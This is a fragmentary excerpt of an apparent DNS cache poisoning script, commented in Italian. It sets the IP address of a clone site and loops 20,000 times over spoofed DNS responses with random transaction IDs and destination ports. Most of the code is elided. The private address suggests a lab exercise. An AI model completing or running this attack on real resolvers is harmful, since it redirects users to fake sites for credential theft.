...
malicious_ip = "172.20.0.80"     # IP del sito clone 
# -----------------------------
...
def brute_force_poison():
    # Incremento del numero di tentativi per coprire più combinazioni
    for i in range(1, 20001): 
        # Generazione TXID e Porta Destinazione casuali per ogni pacchetto
        ...
        packet = (
            ...
            UDP(sport=53, dport=rand_port) / #dport variabile
